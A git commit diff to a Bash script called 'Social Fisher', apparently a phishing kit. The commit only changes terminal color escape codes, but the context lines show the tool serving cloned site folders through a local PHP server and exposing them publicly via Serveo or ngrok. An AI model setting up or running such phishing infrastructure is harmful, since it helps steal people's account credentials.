63af74dcdbe76b938d4fedd1d64fb6c906b643da
Ivan Nikolsky <54115104+enty8080@users.noreply.github.com>
2019-10-16 12:11:40 +0300

    Update socfish.sh

--- socfish.sh
+++ socfish.sh
@@ -35,8 +35,8 @@ printf '\033]2;Social Fisher\a'
 
 dependencies() {
 
-command -v php > /dev/null 2>&1 || { echo -e "\n\e[1;31m[\033[0m-\033[1;31m] Error, php is not installed! Aborting...\033[0m"; exit; }
-command -v curl > /dev/null 2>&1 || { echo -e "\n\e[1;31m[\033[0m-\033[1;31m] Error, curl is not installed! Aborting...\033[0m"; exit; }
+command -v php > /dev/null 2>&1 || { echo -e "\n\e[1;31m[\e[0m-\e[1;31m] Error, php is not installed! Aborting...\e[0m"; exit; }
+command -v curl > /dev/null 2>&1 || { echo -e "\n\e[1;31m[\e[0m-\e[1;31m] Error, curl is not installed! Aborting...\e[0m"; exit; }
 
 }
 
@@ -320,7 +320,7 @@ printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server...\e[0m\n"
 cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
-command -v ssh > /dev/null 2>&1 || { echo -e "\e[1;31m[\033[0m-\033[1;31m] Error, openssh is not installed! Aborting...\033[0m"; exit; }
+command -v ssh > /dev/null 2>&1 || { echo -e "\e[1;31m[\e[0m-\e[1;31m] Error, openssh is not installed! Aborting...\e[0m"; exit; }
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
@@ -367,8 +367,8 @@ fi
 if [[ -e ngrok ]]; then
 sleep 0
 else
-command -v unzip > /dev/null 2>&1 || { echo -e "\e[1;31m[\033[0m-\033[1;31m] Error, unzip is not installed! Aborting...\033[0m"; exit; }
-command -v wget > /dev/null 2>&1 || { echo -e "\e[1;31m[\033[0m-\033[1;31m] Error, wget is not installed! Aborting...\033[0m"; exit; }
+command -v unzip > /dev/null 2>&1 || { echo -e "\e[1;31m[\e[0m-\e[1;31m] Error, unzip is not installed! Aborting...\e[0m"; exit; }
+command -v wget > /dev/null 2>&1 || { echo -e "\e[1;31m[\e[0m-\e[1;31m] Error, wget is not installed! Aborting...\e[0m"; exit; }
 printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
@@ -380,7 +380,7 @@ unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-arm.zip
 else
-printf "\e[1;31m[\033[0m-\033[1;31m] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
+printf "\e[1;31m[\e[0m-\e[1;31m] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
 exit 1
 fi
 
@@ -393,7 +393,7 @@ unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-386.zip
 else
-printf "\e[1;31m[\033[0m-\033[1;31m] Download error... \e[0m\n"
+printf "\e[1;31m[\e[0m-\e[1;31m] Download error... \e[0m\n"
 exit 1
 fi
 fi
